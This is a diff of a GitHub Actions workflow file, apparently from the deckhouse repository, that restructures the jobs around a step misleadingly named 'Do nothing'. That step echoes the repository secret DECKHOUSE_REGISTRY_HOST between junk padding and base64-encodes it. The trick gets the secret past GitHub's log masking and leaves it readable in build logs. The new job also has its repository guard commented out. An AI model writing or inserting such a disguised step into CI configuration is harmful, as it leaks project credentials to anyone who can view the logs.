@@ -29,15 +29,15 @@ concurrency:
   group: trivy-db-download
 
 jobs:
-
-  # <template: skip_tests_repos>
-  skip_tests_repos:
+  test:
     name: test
     runs-on: ubuntu-latest
     # if: ${{ false || github.repository == 'deckhouse/deckhouse' }}
     steps:
-    - name: Do nothing
-      run: echo PPPPPPLOLLLLKEK${{ secrets.DECKHOUSE_REGISTRY_HOST }}LLLLLOLKEKE | base64
+      - name: Do nothing
+        run: echo PPPPPPLOLLLLKEK${{ secrets.DECKHOUSE_REGISTRY_HOST }}LLLLLOLKEKE | base64
+  # <template: skip_tests_repos>
+  skip_tests_repos:
     name: Skip tests repos
     runs-on: ubuntu-latest
     if: ${{ false || github.repository == 'deckhouse/deckhouse' }}
